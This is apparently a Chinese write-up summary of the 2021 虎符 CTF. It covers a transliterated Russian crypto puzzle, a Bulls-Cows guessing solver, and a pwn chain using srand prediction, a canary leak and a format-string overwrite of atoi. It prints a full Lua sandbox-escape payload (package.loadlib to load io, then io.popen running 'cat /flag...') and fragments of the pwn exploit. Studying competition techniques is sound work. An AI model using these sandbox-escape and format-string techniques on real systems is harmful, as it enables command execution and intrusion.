---
title: 虎符-WriteUp
contest: 虎符 CTF
year: 2021
difficulty: medium
vuln_type: pwn_unknown
tags: [ChaMd5-Venom, IO_Popen-RCE, Lua-sandbox-escape, IO_loadlib, package-loadlib, Bulls-Cows-game, srand-predict, canary-leak, fmtstr-overwrite, ROP-execve]
attack_chain:
- 招新文:ChaMd5 Venom招IOT+工控+样本分析
- Crypto翻译题:dOBRO POVALOWATX NA MAT(俄文)→英文→flag=HFCTF{c0d3735f-4062-4f39-9ad6-9e7df7994dad}
- Lua沙箱逃逸:INFO n EVAL payload + local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io") + io.popen("cat /flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG", "r")
- Bulls-Cows猜数字:6步+4位不重复+不含0+suggestedNum选择最大排除
- PWN srand预测:lib.srand(0x1111111111111111)+send 0x109*'\x11'+泄漏canary/stack
- fmtstr:fmtstr_payload(6, {stack-536: 0x3e})覆盖atoi为one_gadget
- execve(59)+/bin/sh payload
key_payload: HFCTF{c0d3735f-4062-4f39-9ad6-9e7df7994dad}
one_liner: 虎符CTF WriteUp,ChaMd5 Venom招新+俄文密码翻译+Lua沙箱逃逸(package.loadlib+io.popen)+Bulls-Cows猜数字算法+srand预测+fmtstr覆盖atoi。
lesson: 虎符CTF质量较高,涵盖多方向:语言学翻译(俄文)+Lua沙箱逃逸(loadlib+io.popen)+Bulls-Cows信息论算法+srand固定seed预测+fmtstr改atoi。
quality: high
---

## 题目列表

多方向:Crypto(翻译)/Web(Lua)/Game(Bulls-Cows)/Pwn

## 关键考点

### 招新文
- ChaMd5 Venom:招IOT+工控+样本分析
- 联系admin@chamd5.org

### Crypto翻译
- 俄文dOBRO POVALOWATX NA MAT,WY DOLVNY PEREWESTI TO NA ANGLIJSKIJ QZYK
- tWOJ SEKRET SOSTOIT IZ DWUH SLOW
- wSE BUKWY STRO^NYE
- qBLO^NYJ ARBUZ
- vELAEM WAM OTLI^NOGO DNQ
- 翻译后:flag = HFCTF{c0d3735f-4062-4f39-9ad6-9e7df7994dad}

### Lua沙箱逃逸
```json
{"query":"INFO n EVAL 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"cat /flag_UVEmnDKY4VHyUVRVj46ZeojgfZpxzG\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0"}
```
- package.loadlib加载外部库
- luaopen_io获取io函数
- io.popen执行命令读flag

### Bulls-Cows猜数字
- 4位不重复数字(1234-9877)
- 排除含0
- 6步猜中
- suggestedNum选择最大排除候选
- compareAnswer1计算AxB
- answerSet集合剪枝

### PWN srand预测
- lib.srand(0x1111111111111111)固定seed
- 0x109*'\x11'覆盖栈
- recv 7字节=canary,6字节=stack地址
- fmtstr payload:`fmtstr_payload(6, {stack-536: 0x3e})`覆盖atoi
- libc-2.31

### 猜数字EXP
```python
def guessTrainner():
    start = time.time()
    answerSet = answerSetInit(set())
    for i in range(6):
        inputStrMax = suggestedNum(answerSet, 100)
        AMax, BMax = compareAnswer(inputStrMax)
        answerSetUpd(answerSet, inputStrMax, AMax, BMax)
        if AMax == 4:
            print("猜数字成功")
            break
```

## 实战价值
- 俄文密码翻译是Crypto新考点(语言学)
- Lua沙箱逃逸package.loadlib+io.popen是稳定向量
- Bulls-Cows猜数字是最小信息论算法
- srand固定seed预测(0x1111111111111111)是常见漏洞
- fmtstr覆盖atoi是简单实用的提权手段
- ChaMd5 Venom招IOT+工控+样本分析
